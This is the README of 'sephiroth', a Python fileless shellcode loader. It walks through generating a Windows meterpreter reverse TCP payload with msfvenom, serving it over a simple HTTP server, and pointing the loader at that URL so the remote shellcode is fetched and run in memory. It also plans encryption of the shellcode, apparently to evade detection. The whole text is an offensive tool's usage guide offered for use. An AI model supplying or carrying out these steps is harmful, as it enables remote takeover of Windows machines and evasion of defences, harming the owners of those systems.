![Alt text](<2024-02-20 07_45_57-C__Windows_System32_cmd.exe.png>)

Greetings
-------------------

sephiroth  is a Fileless Shellcode Loader with Python :


Usage: python Sephiros.py -url 'urlforshellcode'


you can also just embed shellcode into the PE using -sh 'pathofshellcode'

fileless executing example:
-------------------
generate shellcode with:

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=0.0.0.0 LPORT=5555 -f raw  -o shellcode

python3 -m http.server 80


then:

python Sephiroth.py -url http://yourip/shellcode

todo
--------
asymetric encryption to the shellcode
